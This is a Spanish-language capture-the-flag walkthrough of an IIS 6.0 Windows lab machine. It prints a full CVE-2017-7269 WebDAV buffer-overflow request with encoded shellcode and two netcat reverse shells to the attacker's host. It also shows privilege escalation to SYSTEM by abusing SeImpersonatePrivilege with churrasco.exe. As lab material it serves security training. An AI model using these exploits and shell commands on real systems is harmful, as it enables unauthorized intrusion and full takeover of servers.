>Primero realizamos un escaneo de Nmap de los puertos TCP de la máquina víctima:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/grandpa]
└─$ sudo nmap -p- -sS -Pn -n --open --min-rate 5000 -sV 10.129.42.68
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-15 09:34 EST
Nmap scan report for 10.129.42.68
Host is up (0.058s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.28 seconds
```

>En esta máquina vamos a emplear el Buffer Overflow que tiene la versión de IIS 6.0 **CVE-2017-7269** https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/grandpa]
└─$ python2 exploit.py 10.129.42.68 80 10.10.14.71 443
PROPFIND / HTTP/1.1
Host: localhost
Content-Length: 1744
If: <http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣㍤䘰硅楒吱䱘橑牁䈱瀵塐㙤汇㔹呪倴呃睒偡㈲测水㉇扁㝍兡塢䝳剐㙰畄桪㍴乊硫䥶乳䱪坺潱塊㈰㝮䭉前䡣潌畖畵景癨䑍偰稶手敗畐橲穫睢癘扈攱ご汹偊呢倳㕷橷䅄㌴摶䵆噔䝬敃瘲牸坩䌸扲娰夸呈ȂȂዀ栃汄剖䬷汭佘塚祐䥪塏䩒䅐晍Ꮐ栃䠴攱潃湦瑁䍬Ꮐ栃千橁灒㌰塦䉌灋捆关祁穐䩬> (Not <locktoken:write1>) <http://localhost/bbbbbbb祈慵佃潧歯䡅㙆杵䐳㡱坥婢吵噡楒橓兗㡎奈捕䥱䍤摲㑨䝘煹㍫歕浈偏穆㑱潔瑃奖潯獁㑗慨穲㝅䵉坎呈䰸㙺㕲扦湃䡭㕈慷䵚慴䄳䍥割浩㙱乤渹捓此兆估硯牓材䕓穣焹体䑖漶獹桷穖慊㥅㘹氹䔱㑲卥塊䑎穄氵婖扁湲昱奙吳ㅂ塥奁煐〶坷䑗卡Ꮐ栃湏栀湏栀䉇癪Ꮐ栃䉗佴奇刴䭦䭂瑤硯悂栁儵牺瑺䵇䑙块넓栀ㅶ湯ⓣ栁ᑠ栃̀翾Ꮐ栃Ѯ栃煮瑰ᐴ栃⧧栁鎑栀㤱普䥕げ呫癫牊祡ᐜ栃清栀眲票䵩㙬䑨䵰艆栀䡷㉓ᶪ栂潪䌵ᏸ栃⧧栁VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A>
```

>Recibimos la reverse shell como el usuario **NT AUTHORITY\network**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/grandpa]
└─$ rlwrap nc -nlvp 443 
listening on [any] 443 ...
connect to [10.10.14.71] from (UNKNOWN) [10.129.42.68] 1030
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
```

>Vemos el token **SeImpersonatePrivilege** en el usuario que estamos empleando y está habilitado así que podemos escalar privilegios con esto:

```powershell
C:\privesc>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
```

>Subimos mediante una share de SMB en nuestra máquina local los archivos nc.exe y churrasco.exe para abusar el **SeImpersonatePrivilege**:

```bash
C:\privesc>copy \\10.10.14.71\share\nc.exe C:\privesc\nc.exe
copy \\10.10.14.71\share\nc.exe C:\privesc\nc.exe
        1 file(s) copied.

C:\privesc>copy \\10.10.14.71\share\churrasco.exe C:\privesc\churrasco.exe
copy \\10.10.14.71\share\churrasco.exe C:\privesc\churrasco.exe
        1 file(s) copied.
```

>Explotamos el token con **churrasco.exe** y recibimos una shell como **NT AUTHORITY\SYSTEM**:

```powershell
C:\privesc>.\churrasco.exe "C:\privesc\nc.exe 10.10.14.71 4444 -e cmd.exe"
```

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/grandpa]
└─$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.71] from (UNKNOWN) [10.129.42.68] 1035
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami
whoami
nt authority\system
```
